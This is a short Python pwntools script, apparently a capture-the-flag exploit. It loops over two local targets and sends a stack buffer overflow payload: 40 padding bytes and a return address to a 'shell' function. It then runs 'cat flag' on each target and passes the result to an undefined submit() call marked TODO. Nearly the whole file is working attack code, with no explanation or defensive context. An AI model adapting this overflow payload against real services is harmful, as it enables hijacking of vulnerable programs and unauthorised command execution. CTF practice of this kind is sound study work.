#!/usr/bin/env python3
import time
from pwn import *

context.arch = "amd64"
context.log_level = "error"

def e(s):
    return s.encode('utf-8')

def d(s):
    return s.decode('utf-8')

def attack(ip, port):
    # connect to server
    r = remote(ip, port)
    
    # attack
    shell = 0x400566
    payload = b'A' * 40 + p64(shell)
    r.sendline(payload)
    time.sleep(0.5)

    # get flag
    r.sendline("cat flag")
    flag = d(r.recvline().strip())

    return flag

targets = [("127.0.0.1", 6666), ("127.0.0.1", 7777)]

for ip, port in targets:
    flag = attack(ip, port)
    print(flag)
    submit(flag) # TODO
